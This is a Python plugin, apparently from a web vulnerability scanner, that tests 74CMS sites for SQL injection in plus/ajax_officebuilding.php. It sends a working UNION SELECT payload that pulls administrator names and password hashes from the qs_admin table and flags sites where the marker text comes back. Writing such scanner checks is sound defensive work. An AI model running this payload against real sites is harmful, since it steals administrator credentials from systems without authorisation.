#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "plus/ajax_officebuilding.php?act=alphabet&x=11%d5'%20union%20select%201,2,3,concat(0x3C2F613E20),5,6,7,concat(0x4E56535F544553542D2D,admin_name,0x3A,pwd,0x2D2D4E56535F54455354),9%20from%20qs_admin%23"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('NVS_TEST')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain']+ob['base_path'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:CHECK74CMSSQLINJECTION1.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:CHECK74CMSSQLINJECTION1.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def